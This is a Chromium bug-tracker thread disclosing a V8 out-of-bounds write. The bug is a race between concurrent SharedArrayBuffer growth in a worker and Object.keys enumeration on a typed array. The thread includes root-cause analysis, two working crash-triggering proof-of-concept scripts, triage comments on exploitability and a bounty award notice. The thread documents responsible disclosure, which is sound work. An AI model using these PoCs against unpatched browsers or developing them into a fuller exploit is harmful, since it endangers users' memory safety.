## Description

# Steps to reproduce the problem

run with:
Download worker.js and poc.js and put them in the same directory.
d8 poc.js

# Problem Description

## Foreword

Since this vulnerability and the previous report <https://issues.chromium.org/issues/487768771> were introduced in the same commit, I suspect they will most likely be assigned to the same Google developer.

To prevent unnecessary issue merging, please allow me to clarify here that these two vulnerabilities are not caused by the same code. This issue is in the **key enumeration** path, not the values/entries path.

Thank you for reading.

## Root Cause

TOCTOU length mismatch in the key-enumeration pipeline, compounded by missing tail-reservation enforcement, leading to OOB writes.

- `PrependElementIndicesImpl` size estimation uses snapshot A
- `DirectCollectElementIndicesImpl` iteration uses snapshot B
- If B > A, `list->set(insertion_index, ...)` can exceed list bounds

Additional risk in this path:

- `nof_indices` can consume space reserved for `nof_property_keys`
- later `CopyObjectToObjectElements(... nof_indices, nof_property_keys)` can become OOB copy as well

## Trigger Path and Call Chain

This issue is in the **key enumeration** path, not the values/entries path.

Key chain:

1. `Object.keys(ta)` / `for-in` / `JSON.stringify(ta)` enters key collection.
2. `PrependElementIndicesImpl` estimates size and allocates using one length snapshot:
   - `src/objects/elements.cc:1426`
   - `src/objects/elements.cc:1438` / `src/objects/elements.cc:1455`
3. `DirectCollectElementIndicesImpl` reads length again and writes:
   - Length read: `src/objects/elements.cc:1389`
   - Write sites: `src/objects/elements.cc:1399` / `src/objects/elements.cc:1403`
4. Concurrent `sab.grow(...)` makes second length exceed first allocation, causing OOB writes.

# Summary

Concurrent GSAB Growth Causes OOB Write in Key Enumeration

# Custom Questions

#### Type of crash:

tab

#### Crash state:

```
To differentiate this from the report at https://issues.chromium.org/issues/487768771, a pocjs script that can cause the release version to crash is constructed here. This out-of-bounds write might trigger a check, and running it multiple times can trigger crashes in different locations.

This is the debug version of the PoC. If the asan version above cannot be verified, please use the two JS files below for verification. Also using d8 poc.js

### aj...@google.com (2026-02-26)

Thanks for pointing out the possibly related issue, sending to v8 for further triage.

### ch...@google.com (2026-02-27)

Setting milestone because of s0/s1 severity.

### ch...@google.com (2026-02-27)

Setting Priority to P1 to match Severity s1. To ensure SLOs are tracked correctly, priority must exceed severity.

### ma...@chromium.org (2026-03-02)

This is indeed very similar, but not the same, as <https://issues.chromium.org/u/1/issues/487768771>.

Here we also write beyond the end of the FixedArray, but there's no obvious RightTrim or something like that that would happen right after and trigger a CHECK.

The exploitability is limited by the fact that we don't have much control over what gets written; it's the indices (0, 1, 2...) we enumerated, so, might be difficult to make that trigger something evil down the line. Even if we manage to write an interesting location with some big element index, the neighbouring locations will also be overwritten. Not saying it's *not* exploitable tho, maybe there's some corner where this primitive is enough.

### qy...@gmail.com (2026-03-02)

The code below borrows the pocjs format from your previous issue, which can avoid triggering checks in release and asan versions, while also triggering dcheck in debug versions.

```
const workerScript = function() {
onmessage = function(msg) {
  const sab = (msg && typeof msg === "object" && "data" in msg) ? msg.data : msg;
  const max = sab.maxByteLength;
  for (let n = sab.byteLength + 1; n <= max; ++n) {
    sab.grow(n);
  }
};
}

const w = new Worker(workerScript, {type: 'function'});

const sab = new SharedArrayBuffer(1, { maxByteLength: 0x4000 });
const ta = new Uint8Array(sab);

w.postMessage(sab);

for (let i = 0; i < 2500; ++i) {
  Object.keys(ta);
}

w.terminate();

```

### qy...@gmail.com (2026-03-02)

This is the PoCJS that can trigger memory crashes in both the ASAN and Release versions (due to a race condition, it may trigger a check, but in most cases it will trigger signal 11 SEGV\_MAPERR).

```
const workerScript = function() {
onmessage = function(msg) {
  const data = (msg && typeof msg === "object" && "data" in msg) ? msg.data : msg;
  const sab = data.sab;
  const sync = new Int32Array(data.sync);
  const max = sab.maxByteLength;

  // Signal ready
  Atomics.store(sync, 0, 1);
  Atomics.notify(sync, 0);

  // Wait for go signal
  Atomics.wait(sync, 1, 0);

  // Grow as fast as possible
  for (let n = sab.byteLength + 1; n <= max; ++n) {
    try { sab.grow(n); } catch(e) {}
  }

  // Signal done
  Atomics.store(sync, 2, 1);
  Atomics.notify(sync, 2);
};
}

const MAX_BYTES = 0x4000;



function tryRace() {
  const sab = new SharedArrayBuffer(1, { maxByteLength: MAX_BYTES });
  const ta = new Uint8Array(sab);
  const syncBuf = new SharedArrayBuffer(16);
  const sync = new Int32Array(syncBuf);

 const w = new Worker(workerScript, {type: 'function'});
  w.postMessage({ sab, sync: syncBuf });

  // Wait for worker ready
  while (Atomics.load(sync, 0) === 0) {}

  // Signal worker to start growing
  Atomics.store(sync, 1, 1);
  Atomics.notify(sync, 1);

  // Race with Object.keys while worker grows the SAB
  while (Atomics.load(sync, 2) === 0) {
    try { Object.keys(ta); } catch(e) {}
  }

  w.terminate();
}

for (let round = 0; round < 200; round++) {
  tryRace();
}

### qy...@gmail.com (2026-03-03)

Thank you for uploading this to CF for verification. I reviewed the results, and because CF runs with the `--verify-heap` flag, it was able to detect that an OOB write modified the object’s map.

If you’d like to further confirm what I’m saying (i.e., that it won’t hit the CHECK), you can run our `poc.js` in CF without any flags.

Sorry for taking up your time — I just hope that when VRP reviews our comments later, they can recognize that these two issues are exploitable.

That said, if you think the current results are already sufficient to show that both issues can lead to a potentially exploitable OOB write, I agree we can proceed with fixing them.

### ml...@google.com (2026-03-03)

For posterity: The values written seem limited (0,1,2,3) but this still seems like a useful gadget. Keeping the classification.

### ml...@chromium.org (2026-03-03)

[Comment #11](https://issues.chromium.org/issues/487746373#comment11): I think we are good with the CF repro as that's default treated as security issue (memory corruption) with the same classification.

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $8000.00 for this report.

Rationale for this decision:
Baseline with bisect. Memory corruption in a sandboxed process


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
